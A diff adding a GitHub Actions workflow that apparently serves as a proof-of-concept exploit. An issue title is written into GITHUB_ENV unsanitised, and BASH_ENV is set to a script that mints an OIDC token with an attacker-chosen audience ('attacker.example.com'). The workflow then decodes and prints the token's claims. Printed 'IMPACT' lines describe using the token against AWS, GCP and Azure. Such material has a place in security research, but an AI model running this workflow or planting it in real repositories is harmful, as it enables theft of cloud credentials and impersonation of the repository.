@@ -1,0 +1,71 @@
+name: OIDC full claims dump
+on:
+  issues:
+    types: [opened]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  claims-dump:
+    runs-on: ubuntu-latest
+    if: contains(github.event.issue.title, 'oidc-claims-dump')
+    steps:
+      - name: Inject BASH_ENV + mint OIDC
+        run: |
+          echo "ISSUE=${{ github.event.issue.title }}" >> $GITHUB_ENV
+          cat > /tmp/mint_oidc.sh << 'BEOF'
+          export MINTED=yes
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            JWT=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https://attacker.example.com" 2>/dev/null \
+              | python3 -c "import json,sys; print(json.loads(sys.stdin.read()).get('value',''))" 2>/dev/null) || true
+            if [ -n "$JWT" ]; then
+              echo "$JWT" > /tmp/oidc_jwt.txt
+              # Full claims decode
+              HEADER=$(echo "$JWT" | cut -d. -f1 | python3 -c "import base64,sys; s=sys.stdin.read().strip(); s+='='*(4-len(s)%4); print(base64.urlsafe_b64decode(s).decode())" 2>/dev/null) || true
+              PAYLOAD=$(echo "$JWT" | cut -d. -f2 | python3 -c "import base64,sys; s=sys.stdin.read().strip(); s+='='*(4-len(s)%4); print(base64.urlsafe_b64decode(s).decode())" 2>/dev/null) || true
+              echo "$HEADER" > /tmp/oidc_header.json
+              echo "$PAYLOAD" > /tmp/oidc_claims.json
+            fi
+          fi
+          BEOF
+          echo "BASH_ENV=/tmp/mint_oidc.sh" >> $GITHUB_ENV
+
+      - name: Display full OIDC claims from BASH_ENV-injected code
+        run: |
+          echo "=== BASH_ENV SOURCED: $MINTED ==="
+          echo ""
+          if [ -f /tmp/oidc_header.json ]; then
+            echo "=== JWT HEADER ==="
+            python3 -m json.tool /tmp/oidc_header.json 2>/dev/null
+          fi
+          echo ""
+          if [ -f /tmp/oidc_claims.json ]; then
+            echo "=== FULL JWT CLAIMS (attacker sees all of this) ==="
+            python3 -m json.tool /tmp/oidc_claims.json 2>/dev/null
+            echo ""
+            echo "=== CRITICAL CLAIMS ==="
+            python3 -c "
+import json
+with open('/tmp/oidc_claims.json') as f:
+    c = json.load(f)
+print(f'sub (identity):     {c.get(\"sub\",\"?\")}')
+print(f'aud (audience):     {c.get(\"aud\",\"?\")}')
+print(f'iss (issuer):       {c.get(\"iss\",\"?\")}')
+print(f'repository:         {c.get(\"repository\",\"?\")}')
+print(f'repository_owner:   {c.get(\"repository_owner\",\"?\")}')
+print(f'actor:              {c.get(\"actor\",\"?\")}')
+print(f'workflow:           {c.get(\"workflow\",\"?\")}')
+print(f'ref:                {c.get(\"ref\",\"?\")}')
+print(f'event_name:         {c.get(\"event_name\",\"?\")}')
+print(f'runner_environment: {c.get(\"runner_environment\",\"?\")}')
+print()
+print('IMPACT: This token authenticates as the REPOSITORY to cloud providers.')
+print('The attacker (issue creator) controls the audience claim.')
+print('AWS: sts:AssumeRoleWithWebIdentity with this token')
+print('GCP: workloadIdentityPools with this token')
+print('Azure: federatedIdentityCredentials with this token')
+" 2>/dev/null
+          fi
